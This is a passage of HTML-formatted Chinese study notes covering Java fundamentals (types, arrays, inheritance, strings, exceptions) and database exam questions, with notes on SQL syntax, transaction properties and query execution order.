punctuation">,</span>但是javac指令仅仅能在JDK安装目录下的bin目录下使用。而程序开发的时候，不能将源代码写入JDK的安装目录，因此需要将源程序保存到任意位置的指定目录classpath作用：设定为<span class="token keyword">class</span>文件的目录，使classpath目录中的<span class="token punctuation">.</span><span class="token keyword">class</span>可以在任意目录运行DAY_02<span class="token number">4.</span>关键字全部小写<span class="token keyword">goto</span>和<span class="token keyword">const</span>是保留字<span class="token number">5.</span>包其实就是文件夹，用于把相同类名进行区分类或者接口：每个单词首字母大写 方法变量：从第二个单词开始首字母大写文档注释<span class="token comment">/** **/</span><span class="token number">6.8421</span>码 是bcd一种<span class="token number">7.</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token keyword">byte</span> b1 <span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>b2 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span>b<span class="token punctuation">;</span>b<span class="token operator">=</span>b1<span class="token operator">+</span>b2<span class="token punctuation">;</span><span class="token comment">//类型提升，将byte转化为Int类型</span>b<span class="token operator">=</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">//常量相加，先把结果计算出来，然后再转为对应类型</span><span class="token class-name">XJad</span><span class="token operator">:</span>将<span class="token punctuation">.</span><span class="token keyword">class</span>文件反编译为java文件<span class="token number">8.</span>计算机中数据运算都是补码进行的获取<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">130</span>二进制<span class="token operator">-></span>做截取，截成<span class="token keyword">byte</span><span class="token operator">-></span>已知补码求原码其中第三步：补码 <span class="token number">10000010</span><span class="token operator">-></span>反码 <span class="token number">10000001</span> <span class="token operator">-></span> 原码 <span class="token number">11111110</span>由此<span class="token keyword">byte</span> <span class="token number">130</span> 为<span class="token operator">-</span><span class="token number">126</span><span class="token number">9.</span>看程序写结果字符和一个整数相加，<span class="token function">println</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">98</span>字符串数据和其他数据做<span class="token operator">+</span>，这个<span class="token operator">+</span>是字符串连接符DAY_03 _04<span class="token number">1.</span><span class="token operator">&amp;</span>有<span class="token boolean">false</span>则<span class="token boolean">false</span> <span class="token operator">|</span> 有<span class="token boolean">true</span>则<span class="token boolean">true</span> <span class="token operator">^</span><span class="token punctuation">(</span>异或<span class="token punctuation">)</span> 相同为<span class="token boolean">false</span><span class="token number">2.</span><span class="token class-name">Alt</span><span class="token operator">+</span><span class="token operator">/</span>自动填充函数<span class="token number">3.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>里头可以输出汉字<span class="token class-name">Scanner</span> in  <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"echo:"</span><span class="token operator">+</span>in<span class="token punctuation">.</span><span class="token function">nextline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2+3="</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">3</span>）<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">4.</span>ctrl<span class="token operator">+</span><span class="token operator">/</span> 注释代码或解开注释<span class="token number">5.</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"100-"</span><span class="token operator">+</span>in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"="</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>要输入两次<span class="token number">6.</span><span class="token keyword">return</span> 不是结束循环，而是结束方法DAY _05<span class="token number">1.</span>数组逆序（元素对调）返回值类型 <span class="token keyword">void</span>！！！（无需返回，<span class="token keyword">void</span>返回的就是数组地址）<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> x<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>arr<span class="token punctuation">.</span>lenght<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token number">2.</span><span class="token keyword">final</span> <span class="token keyword">int</span> 常量定义<span class="token number">3.</span><span class="token keyword">void</span>类型 没有明确的返回值 直接输出不能够输出调用 赋值调用 因为println不能是空类型<span class="token number">4.</span>数组初始化有动态、静态两种方式，只能任选其一：动态：<span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>  静态：<span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span>arr <span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">new</span>可以看成是为arr分配地址<span class="token number">5.</span>栈：存放局部变量栈的特点：用完即释放堆：堆放所有<span class="token keyword">new</span>出来的东西堆的特点：每个都有地址值 都有初始值 使用完毕变成垃圾，没有立即回收，会在空闲时回收<span class="token class-name">Array</span> <span class="token class-name">Index</span> <span class="token class-name">Out</span> of <span class="token class-name">Bound</span> <span class="token class-name">Exception</span><span class="token operator">:</span>数组索引越界<span class="token class-name">Null</span> <span class="token class-name">Pointer</span> <span class="token class-name">Exception</span><span class="token operator">:</span>空指针异常 DAY_06<span class="token number">1</span>、二维数组 定义格式 推荐：数据类型 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> 数组名 <span class="token operator">=</span> <span class="token keyword">new</span> 数据类型<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>其他：数据类型 数组名<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> 数据类型<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>          数据类型<span class="token punctuation">[</span><span class="token punctuation">]</span> 数组名<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> 数据类型<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token number">2.</span>一个java文件中写两个类：一个基本的类，一个测试类在测试类（含主函数）中编译<span class="token class-name">Java</span>文件，会将该类所涉及的所有类都编译成<span class="token keyword">class</span>报错实参形参长度不同，一定是没有给一定数量的参数或者压根没有给参数<span class="token number">3.</span>main 方法储存在栈里头，然后在堆里储存类的代码，最后调用在方法区的方法DAY_07<span class="token number">1.</span>成员变量与局部变量的区别成员变量在类中方法外 局部变量在定义中或方法声明上成员变量在堆内存，局部变量在栈内存成员变量随着对象的创建而存在，局部变量随着方法调用存在成员变量有默认初始化值，局部变量必须定义赋值然后才能使用<span class="token number">2.</span>类型包括基本数据类型、引用类型（数组、类、接口）  形式参数的改变直接影响实际参数（如果是引用类型的话）  方法里头调用一个类，此时传进去的是类的地址<span class="token number">3.</span>匿名对象：没有名字的对象 可以作为实际参数传递  <span class="token keyword">new</span> student<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>不适合多次调用，用完被垃圾回收器回DAY_08<span class="token number">1.</span>在同一个文件夹下，类定义在一个文件还是两个文件下相同<span class="token number">2.</span>构造代码块在构造函数之前执行，且出现在类中的成员位置局部代码块用于限定变量的声明周期 静态代码块与构造代码块类似，只是用<span class="token keyword">static</span>修饰了构造代码块只需要在代码外面有一个大括号，在一个类中代码无法在成员变量的位置直接执行例如：<span class="token keyword">class</span> demo<span class="token punctuation">&#123;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>中的输出是无法执行的<span class="token number">3.</span>开发的原则：低耦合，高内聚 耦合：类与类之间的关系 内聚：自己完成事件的能力<span class="token number">4.</span>子类不能继承父类的私有变量和私有方法，即只能继承父类所有非私有的成员<span class="token number">5.</span>举例输出子类局部、成员、继承的父类变量<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">this</span><span class="token punctuation">(</span><span class="token punctuation">)</span>调用本类成员变量的构造方法，<span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>调用父类的构造方法 同理，<span class="token keyword">super</span><span class="token punctuation">.</span>方法，<span class="token keyword">this</span><span class="token punctuation">.</span>方法<span class="token number">6.</span>子类所有构造方法默认会访问父类的【空参数】构造方法 子类初始化之前一定要先完成父类的初始化<span class="token number">7.</span>父类如果只有一个含参构造函数，那么默认的无参构造函数会消失因此要在父类加入一个无参构造函数；或者使用<span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>调用父类的含参构造函数或者通过<span class="token keyword">this</span><span class="token punctuation">(</span><span class="token punctuation">)</span>调用一个访问了父类构造方法的成员方法 而且<span class="token keyword">this</span> <span class="token keyword">super</span>必须在第一个语句上<span class="token number">8.</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>······；<span class="token punctuation">&#125;</span>方法的重写子类不能访问权限比父类更低 比如不可以子类为<span class="token keyword">void</span> 父类为<span class="token keyword">public</span>父类用静态方法，子类也必须用静态方法重写<span class="token class-name">Day</span> <span class="token number">09</span><span class="token operator">:</span><span class="token number">1</span>、<span class="token keyword">final</span> 可以修饰类、方法、变量，此时父类的功能不能被覆盖最终类不能被继承 <span class="token keyword">final</span>的方法 叫覆盖、重写、复写<span class="token keyword">final</span>修饰基本类型：值不能发生改变 修饰引用类型：引用地址不能发生改变<span class="token number">2</span>、多态：有继承关系、有方法重写、有父类引用指向子类对象子类可以访问父类的变量，但是父类不能访问子类的变量 多态中成员变啦领编译运行看左边成员方法的编译看左边，运行看右边弊端：不能使用子类特有的功能向下转型：把 <span class="token class-name">Zi</span> z <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Zi</span><span class="token punctuation">)</span> f f能转化为zi<span class="token number">3</span>、抽象类具有构造方法，但是不能实例化<span class="token number">4</span>、接口没有构造方法 接口方法不能有主体ctrl shitf f 格式化 ctrl shitf o 导包<span class="token class-name">Integer</span><span class="token punctuation">.</span>toHexString 整数转为十六进制<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">&#125;</span>DAY <span class="token number">12</span><span class="token number">1</span>、字符串一旦被赋值，就不能改变 <span class="token class-name">String</span> s 值不能变，但是引用s可以变<span class="token number">2</span>、<span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>创建<span class="token number">2</span>个对象<span class="token punctuation">,</span><span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"hello"</span>创建<span class="token number">1</span>个对象<span class="token number">3</span>、<span class="token operator">==</span> 比较引用对象，是比较地址，equals默认是地址，但是<span class="token class-name">String</span>改写后 判断内容相等<span class="token number">4</span>、字符串相加：如果是变量，先开空间再拼接，如果是常量，先加然后在常量池寻找 有就返回<span class="token number">5</span>、字符串内容为空 <span class="token class-name">String</span> s  <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span>字符串对象为空 <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">null</span><span class="token number">6</span>、<span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 比较字符串内容是否相同，区分大小写<span class="token keyword">boolean</span> <span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 比较自妇产内容是否相同，忽略大小写<span class="token keyword">boolean</span> <span class="token function">contains</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 判断大字符串中是否包含小字符串<span class="token keyword">boolean</span> <span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 判断字符串是否以某个指定的字符串开头<span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 判断字符串是否为空<span class="token number">7</span>、<span class="token keyword">byte</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> getBytes 把字符串转换为字节数组<span class="token keyword">char</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 把字符串转换为字符数组<span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">valueof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chs<span class="token punctuation">)</span> 把字符数组转换为字符串string<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 把字符串转成小写compareTo 函数 按字典顺序比较两个字符串<span class="token number">8</span>、<span class="token class-name">Arrays</span><span class="token punctuation">.</span>toString（arr）把arr转成字符串 <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>数组排序 <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span>  <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">""</span> <span class="token operator">+</span> number <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueof</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span> <span class="token keyword">int</span><span class="token operator">-></span><span class="token class-name">String</span><span class="token class-name">String</span><span class="token operator">-></span><span class="token class-name">Int</span><span class="token operator">:</span> str<span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token number">9</span>、<span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toBinaryString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>十进制转到二进制 <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toOctalString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 转到八进制十进制转到其他进制： <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>num，rad<span class="token punctuation">)</span>其他进制转到十进制：<span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">,</span>rad<span class="token punctuation">)</span><span class="token number">10</span>、<span class="token keyword">try</span><span class="token punctuation">&#123;</span>可能出现的问题<span class="token punctuation">&#125;</span><span class="token keyword">catch</span>（异常名 变量比如：<span class="token class-name">ParseException</span> e）<span class="token punctuation">&#123;</span>针对问题的处理<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>（<span class="token keyword">finally</span><span class="token punctuation">&#123;</span>释放资源<span class="token punctuation">&#125;</span>）<span class="token number">11</span>、<span class="token class-name">Exception</span> e 所有异常的父类 <span class="token function">simpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd HH:MM:ss"</span><span class="token punctuation">)</span><span class="token number">12</span>、如果要自己写一个异常类 需要继承自<span class="token class-name">Exception</span> 或者 继承自<span class="token class-name">RuntimeException</span>字符串考点spllit方法 抽象类不能实例化 异常处理机制 数组的定义 回文 二进制 三角函数 随机数 栈、队列 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>一个数据模型至少需要描述数据的静态特征、动态特征和（ <strong>完整性约束</strong> ）三项内容。</p><p>(<strong>DB</strong> )是长期存储在计算机内的有组织、可共享的数据集合。 </p><p>关于关系，下列说法中正确的是<br><strong>Ⅰ.关系中的每一个属性都是不可再分解的</strong><br><strong>Ⅱ.关系中不允许出现取值完全相同的元组</strong><br><strong>Ⅲ.可以不考虑关系中各元组的顺序</strong><br><strong>Ⅳ.可以不考虑关系中各属性的顺序</strong></p><p>对现实世界进行第一层抽象的模型，称为（）模型；对现实世界进行第二层抽象的模型，称为（）模型。 <strong>概念，结构/逻辑</strong></p><p>在E-R图中，用来表示属性的图形是（    ） <strong>椭圆形</strong> </p><p>SQL语言中用（ <strong>rollback</strong>）语句实现事务的回滚</p><p>触发器是一种特殊类型的存储过程，它不同于存储过程。</p><p>视图和表不一样，不是在物理上存在的一种数据库对象。</p><p>在SQL语言中的视图VIEW是数据库的（ <strong>外模式</strong>） 。</p><p>下列关于关系数据库的操作特点的说法，正确的是<br>    A. 需要指明操作的要求和操作的实现过程<br>    <strong>B. 需要指明操作的要求，但不需要指明操作的实现过程    √</strong><br>    C. 需要指明操作的实现过程，但不需要指明操作的要求<br>    D. 对操作要求和操作实现过程都不需要指明</p><p>下述对出生日期进行比较的表达式中，正确的是<br>    A. 出生日期 &gt;‘1980/1/1’</p><p>从一个表中筛选数据向另一个已经存在的表添加所用的命令是（ <strong>INSERT…SELECT</strong>    ）。</p><p>若要在基本表中增加一列CN（课程名），可用（ <strong>alter table s add (cn char(8))</strong> ）</p><p>查找表结构用以下哪一项（  <strong>DESC</strong>）</p><p> 在SQL Server中，在表中添加一个新列的正确SQL语句是 <strong>B. ALTER TABLE ADD 新列名 数据类型</strong></p><p>数据类型Numeric(10,4)表示的数据是 <strong>小数点后边有4位数字，小数点前边有6位数字</strong></p><p>TRUNCATE TABLE相当于无条件的DELETE FROM</p><p>数据库的( <strong>完整性</strong>)是 指数据的正确性和相容性。</p><p>数据模型的三要素是<strong>数据结构、数据操作和数据完整性约束</strong></p><p>数据模型的三要素  <strong>数据结构 ，完整性约束，数据操纵</strong></p><p>二维表结构是<strong>关系数据库采用的组织层数据模型</strong></p><p>文件系统具有的数据独立性是(.<strong>设备独立性</strong> )。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><pre class="line-numbers language-none"><code class="language-none">事务（1）原子性：整个事务中的所有操作，要么全部完成，要么全部不完成，不可能停滞在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。   （2）一致性：在事务开始之前和事务结束以后，数据库的完整性约束没有被破坏。   （3）隔离性：隔离状态执行事务，使它们好像是系统在给定时间内执行的唯一操作。如果有两个事务，运行在相同的时间内，执行 相同的功能，事务的隔离性将确保每一事务在系统中认为只有该事务在使用系统。这种属性有时称为串行化，为了防止事务操作间的混淆，  必须串行化或序列化请 求，使得在同一时间仅有一个请求用于同一数据。   （4）持久性：在事务完成以后，该事务所对数据库所作的更改便持久的保存在数据库之中，并不会被回滚。删除操作drop:视图，表table,列columndelete<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>from </li><li>join </li><li>on </li><li>where </li><li>group by(开始使用select中的别名，后面的语句中都可以使用)</li><li> avg,sum…. </li><li>having </li><li>select </li><li>distinct </li><li>order by</li><li>limit<br>从这个顺序中我们不难发现，所有的 查询语句都是从from开始执行的，在执行过程中，每个步骤都会为下一个步骤生成一个虚拟表，这个虚拟表将作为下一个执行步骤的输入。 </li></ol><p><strong>第一步：</strong>首先对from子句中的前两个表执行一个笛卡尔乘积，此时生成虚拟表 vt1（选择相对小的表做基础表）。<br><strong>第二步：</strong>接下来便是应用on筛选器，on 中的逻辑表达式将应用到 vt1 中的各个行，筛选出满足on逻辑表达式的行，生成虚拟表 vt2 。<br><strong>第三步：</strong>如果是outer join 那么这一步就将添加外部行，left outer jion 就把左表在第二步中过滤的添加进来，如果是right outer join 那么就将右表在第二步中过滤掉的行添加进来，这样生成虚拟表 vt3 。</p><p><strong>第四步：</strong>如果 from 子句中的表数目多余两个表，那么就将vt3和第三个表连接从而计算笛卡尔乘积，生成虚拟表，该过程就是一个重复1-3的步骤，最终得到一个新的虚拟表 vt3。 </p><p><strong>第五步：</strong>应用where筛选器，对上一步生产的虚拟表引用where筛选器，生成虚拟表vt4，在这有个比较重要的细节不得不说一下，对于包含outer join子句的查询，就有一个让人感到困惑的问题，到底在on筛选器还是用where筛选器指定逻辑表达式呢？on和where的最大区别在于，如果在on应用逻辑表达式那么在第三步outer join中还可以把移除的行再次添加回来，而where的移除的最终的。举个简单的例子，有一个学生表（班级,姓名）和一个成绩表(姓名,成绩)，我现在需要返回一个x班级的全体同学的成绩，但是这个班级有几个学生缺考，也就是说在成绩表中没有记录。为了得到我们预期的结果我们就需要在on子句指定学生和成绩表的关系（学生.姓名=成绩.姓名）那么我们是否发现在执行第二步的时候，对于没有参加考试的学生记录就不会出现在vt2中，因为他们被on的逻辑表达式过滤掉了,但是我们用left outer join就可以把左表（学生）中没有参加考试的学生找回来，因为我们想返回的是x班级的所有学生，如果在on中应用学生.班级=’x’的话，left outer join会把x班级的所有学生记录找回（感谢网友康钦谋__康钦苗的指正），所以只能在where筛选器中应用学生.班级=’x’ 因为它的过滤是最终的。 </p><p><strong>第六步：</strong>group by 子句将中的唯一的值组合成为一组，得到虚拟表vt5。如果应用了group by，那么后面的所有步骤都只能得到的vt5的列或者是聚合函数（count、sum、avg等）。原因在于最终的结果集中只为每个组包含一行。这一点请牢记。 </p><p><strong>第七步：</strong>应用cube或者rollup选项，为vt5生成超组，生成vt6.<br><strong>第八步：</strong>应用having筛选器，生成vt7。having筛选器是第一个也是为唯一一个应用到已分组数据的筛选器。<br><strong>第九步：</strong>处理select子句。将vt7中的在select中出现的列筛选出来。生成vt8. </p><p><strong>第十步：</strong>应用distinct子句，vt8中移除相同的行，生成vt9。事实上如果应用了group by子句那么distinct是多余的，原因同样在于，分组的时候是将列中唯一的值分成一组，同时只为每一组返回一行记录，那么所以的记录都将是不相同的。 </p><p><strong>第十一步：</strong>应用order by子句。按照order_by_condition排序vt9，此时返回的一个游标，而不是虚拟表。sql是基于集合的理论的，集合不会预先对他的行排序，它只是成员的逻辑集合，成员的顺序是无关紧要的。对表进行排序的查询可以返回一个对象，这个对象包含特定的物理顺序的逻辑组织。这个对象就叫游标。正因为返回值是游标，那么使用order by 子句查询不能应用于表表达式。排序是很需要成本的，除非你必须要排序，否则最好不要指定order by，最后，在这一步中是第一个也是唯一一个可以使用select列表中别名的步骤。 </p><p><strong>第十二步：</strong>应用top选项。此时才返回结果给请求者即用户。 </p><h3 id="一些语句"><a href="#一些语句" class="headerlink" title="一些语句"></a>一些语句</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">between</span> <span class="token number">30</span> <span class="token operator">and</span> <span class="token number">40</span><span class="token keyword">case</span><span class="token keyword">when</span> 订单状态<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">then</span> <span class="token string">'等待出库'</span><span class="token keyword">when</span> 订单状态<span class="token operator">=</span><span class="token string">'2'</span> <span class="token keyword">then</span> <span class="token string">'已发货'</span><span class="token keyword">when</span> 订单状态<span class="token operator">=</span><span class="token string">'3'</span> <span class="token keyword">then</span> <span class="token string">'已完成'</span><span class="token keyword">end</span>substring<span class="token punctuation">(</span>姓名<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//从第1个字符开始 只截取之后的1个字符</span><span class="token keyword">select</span> <span class="token keyword">distinct</span> 城市<span class="token comment">//去重复</span><span class="token keyword">from</span> 购物者<span class="token keyword">create</span> <span class="token keyword">proc</span> prc_score<span class="token variable">@sno</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">as</span><span class="token keyword">begin</span><span class="token keyword">select</span> sname <span class="token keyword">as</span> 姓名<span class="token punctuation">,</span><span class="token function">avg</span><span class="token punctuation">(</span>grade<span class="token punctuation">)</span> <span class="token keyword">as</span> 平均分数<span class="token keyword">from</span> S<span class="token punctuation">,</span>SC<span class="token keyword">where</span> s<span class="token punctuation">.</span>sno<span class="token operator">=</span>sc<span class="token punctuation">.</span>sno<span class="token operator">and</span> s<span class="token punctuation">.</span>sno<span class="token operator">=</span><span class="token variable">@sno</span><span class="token keyword">group</span> <span class="token keyword">by</span> sname<span class="token keyword">end</span><span class="token keyword">exists</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> tuser <span class="token keyword">where</span> uid<span class="token operator">=</span><span class="token variable">@uid</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token string">'-1'</span><span class="token keyword">else</span><span class="token keyword">if</span> <span class="token operator">not</span> <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> tuser <span class="token keyword">where</span> upwd<span class="token operator">=</span><span class="token 